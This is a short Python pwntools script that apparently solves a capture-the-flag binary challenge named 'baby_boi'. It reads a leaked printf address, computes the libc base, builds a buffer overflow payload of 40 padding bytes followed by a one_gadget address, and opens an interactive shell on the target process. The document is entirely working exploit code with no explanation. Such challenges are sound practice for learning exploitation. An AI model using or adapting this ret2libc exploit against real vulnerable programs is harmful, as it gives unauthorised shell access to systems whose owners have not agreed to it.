#!/usr/bin/env python3

# from pwn import *
import pwn

exe = pwn.ELF("./baby_boi_patched")
libc = pwn.ELF("./libc-2.27.so")
ld = pwn.ELF("./ld-2.27.so")

pwn.context.binary = exe

io = pwn.process(exe.path)
io.recvuntil(b"Here I am: ")

leak = io.recvline().strip().decode()
printf_addr = int(leak, 16)

    # printf addr(dynamic) - printf offset(static)
base = printf_addr - libc.symbols["printf"]

onegadget = base + 0x4f322
print(onegadget)
onegadget_byte = onegadget.to_bytes(8, 'little')

offset = 40

payload = b"A" * offset + onegadget_byte

io.sendline(payload)
io.interactive()

